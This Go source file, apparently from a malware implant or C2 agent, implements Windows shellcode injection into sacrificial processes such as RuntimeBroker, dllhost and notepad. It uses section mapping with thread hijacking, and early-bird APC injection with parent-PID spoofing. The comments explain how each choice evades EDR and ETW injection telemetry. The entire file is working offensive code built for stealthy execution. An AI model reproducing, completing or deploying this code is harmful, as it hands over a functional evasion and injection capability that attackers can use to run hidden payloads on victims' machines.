//go:build windows

package agent

// forkRun — shellcode execution in a sacrificial process.
//
// Uses plain CreateProcess (no PPID spoof) + NtCreateSection/NtMapViewOfSection
// (no VirtualAllocEx/WriteProcessMemory) + thread hijack.  PPID spoof triggers
// PsSetCreateProcessNotifyRoutineEx; WPM triggers ETW cross-process injection
// telemetry — both avoided here.

import (
	"fmt"
	"os"

	"golang.org/x/sys/windows"
)

// forkRun spawns a sacrificial process and executes shellcode inside it via
// NtCreateSection + NtMapViewOfSection + thread hijack.  No output is captured.
func forkRun(sc []byte, process string) (string, error) {
	if process == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		candidates := []string{
			sysroot + `\System32\RuntimeBroker.exe`,
			sysroot + `\System32\dllhost.exe`,
			sysroot + `\System32\WerFault.exe`,
		}
		for _, c := range candidates {
			if _, err := os.Stat(c); err == nil {
				process = c
				break
			}
		}
		if process == "" {
			process = sysroot + `\System32\svchost.exe`
		}
	}

	// ── Step 1: Spawn suspended (no PPID spoof) ───────────────────────────────
	pi, err := spawnSuspendedPlain(process)
	if err != nil {
		return "", fmt.Errorf("spawn(%s): %w", process, err)
	}

	// ── Step 2: Map shellcode via NtCreateSection (no VirtualAllocEx / WPM) ────
	remoteAddr, err := injectViaSection(pi.Process, sc)
	if err != nil {
		windows.CloseHandle(pi.Thread)
		terminateSacrificial(pi)
		return "", fmt.Errorf("section inject: %w", err)
	}

	// ── Step 3: Thread hijack — redirect main thread RIP to shellcode ─────────
	if err := hijackThread(pi.Thread, remoteAddr); err != nil {
		windows.CloseHandle(pi.Thread)
		terminateSacrificial(pi)
		return "", fmt.Errorf("thread hijack: %w", err)
	}

	// ── Step 4: Resume thread ─────────────────────────────────────────────────
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		windows.CloseHandle(pi.Thread)
		terminateSacrificial(pi)
		return "", fmt.Errorf("ResumeThread: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)

	return fmt.Sprintf("[+] fork_run: %d B shellcode executed in %s (PID %d)", len(sc), process, pi.ProcessId), nil
}

func terminateSacrificial(pi windows.ProcessInformation) {
	procTerminateProcess.Call(uintptr(pi.Process), 0)
	windows.CloseHandle(pi.Process)
}

// ── Early-bird APC injection ──────────────────────────────────────────────────

var procQueueUserAPC = kernel32.NewProc("QueueUserAPC")

// forkRunAPC spawns a sacrificial process and injects shellcode via QueueUserAPC
// (early-bird pattern). The APC fires before any user code runs because Windows
// loader enters an alertable wait during CRT/ntdll initialisation.
// Unlike thread hijacking, APC injection does not overwrite RIP.
func forkRunAPC(sc []byte, process string) (string, error) {
	if process == "" {
		sysroot := os.Getenv("SystemRoot")
		if sysroot == "" {
			sysroot = `C:\Windows`
		}
		// Prefer plain user binaries — system binaries (RuntimeBroker, dllhost)
		// are PPL-protected or Defender-monitored on Server 2022 and may block suspend.
		for _, c := range []string{
			sysroot + `\System32\notepad.exe`,
			sysroot + `\System32\cmd.exe`,
			sysroot + `\SysWOW64\notepad.exe`,
		} {
			if _, err := os.Stat(c); err == nil {
				process = c
				break
			}
		}
		if process == "" {
			process = sysroot + `\System32\cmd.exe`
		}
	}

	// Spawn suspended with PPID spoofed to explorer.exe.
	pi, err := spawnSuspendedSpoofed(process)
	if err != nil {
		return "", fmt.Errorf("spawn(%s): %w", process, err)
	}

	// Write shellcode via NtCreateSection + NtMapViewOfSection (no WPM)
	remoteAddr, err := injectViaSection(pi.Process, sc)
	if err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("section inject: %w", err)
	}

	// Queue APC to main thread — fires on first alertable wait in loader
	r, _, e := procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	if r == 0 {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("QueueUserAPC: %w", e)
	}

	// Resume — shellcode fires before entry point, process stays alive as host
	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		terminateSacrificial(pi)
		windows.CloseHandle(pi.Thread)
		return "", fmt.Errorf("ResumeThread: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return fmt.Sprintf("[+] APC shellcode queued in %s (early-bird)", process), nil
}
